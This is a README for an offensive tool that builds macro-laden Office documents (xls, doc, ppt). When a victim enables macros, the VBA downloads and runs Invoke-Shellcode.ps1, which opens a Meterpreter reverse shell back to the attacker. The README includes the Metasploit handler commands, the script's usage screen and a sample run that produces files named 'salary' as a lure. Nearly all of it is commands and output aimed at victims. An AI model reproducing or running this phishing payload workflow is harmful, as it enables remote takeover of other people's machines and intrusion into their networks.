# Social-Engineering-Toys
Social Engineering Toys  
  
The script generates office documents (xls, doc and ppt) that includes VBA code that download and run the Invoke-Shellcode.ps1 (creates a meterpreter reverse shell back to server) when the victim enables Macro in the document.  
  
You will need to run the windows/meterpreter/reverse_https payload on your the attacker host.  
```
$ ./msfconsole
msf> use exploit/multi/handler
msf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_https
msf exploit(handler) > set LHOST consulting.example.org
msf exploit(handler) > set LPORT 4443
msf exploit(handler) > set SessionCommunicationTimeout 0
msf exploit(handler) > set ExitOnSession false
msf exploit(handler) > exploit -j
[*] Exploit running as background job.
```
  
Below is the help screen of the script.  
```
$  python injectShell.py -h
usage: injectShell.py [-h] [-t T] [-o O] [-ip IP] [-port PORT]

optional arguments:
  -h, --help  show this help message and exit
  -t T        [xls|doc|ppt|all]
  -o O        [output filename (without extension)]
  -ip IP      [meterpreter listener ip address]
  -port PORT  [meterpreter listener port]

```

Below is the script in action.  

```
$  python injectShell.py -t all -o salary -ip 192.168.1.6 -port 1111 
- Generated: salary.xls
- Generated: salary.doc
- Generated: salary.ppt
```

